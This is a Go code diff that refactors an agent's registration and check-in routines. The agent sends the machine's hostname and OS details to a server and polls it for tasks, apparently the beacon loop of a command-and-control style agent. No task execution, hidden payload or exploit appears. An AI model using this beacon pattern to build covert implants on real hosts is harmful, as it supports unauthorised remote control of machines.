@@ -1,6 +1,8 @@
 package main
 
 // https://grugbrain.dev/
+// i am not sure grug understand go networking goodly
+// but grug try best
 
 import (
 	"fmt"
@@ -14,23 +16,16 @@ import (
 	"github.com/imroc/req/v3"
 )
 
-type ClientInfo struct {
-	Hostname string `json:"hostname"`
-	OS       string `json:"os"`
-	OSName   string `json:"os_name"`
-}
-
 func register(baseurl string) string {
 	log.Printf("%s", "Registering with server at "+baseurl)
 
-	var result struct {
-		AgentID string `json:"agent_id"`
-	}
+	client := req.C()
+	var result RegisterResult
 
-	client := req.C() // .DevMode()
+	var myInfo ClientInfo = ClientInfo{Hostname: GetHostname(), OS: runtime.GOOS, OSName: GetOSSubtype()}
 
 	resp, err := client.R().
-		SetBody(&ClientInfo{Hostname: GetHostname(), OS: runtime.GOOS, OSName: GetOSSubtype()}).
+		SetBody(&myInfo).
 		SetSuccessResult(&result).
 		Post(baseurl + "/register")
 	if err != nil {
@@ -54,11 +49,11 @@ func register(baseurl string) string {
 
 func checkin(baseurl string, agentid string) string {
 	//log.Printf("Checking with server at " + baseurl)
-	client := req.C() // .DevMode()
-	var result struct {
-		Tasks string `json:"tasks"`
-	}
-	post, err := client.R().SetSuccessResult(result).Post(baseurl + "/checkin?agentid=" + agentid)
+	client := req.C()
+	var result TaskResult
+	post, err := client.R().
+		SetSuccessResult(&result).
+		Post(baseurl + "/checkin?agentid=" + agentid)
 	if err != nil {
 		log.Fatal(err)
 		return ""
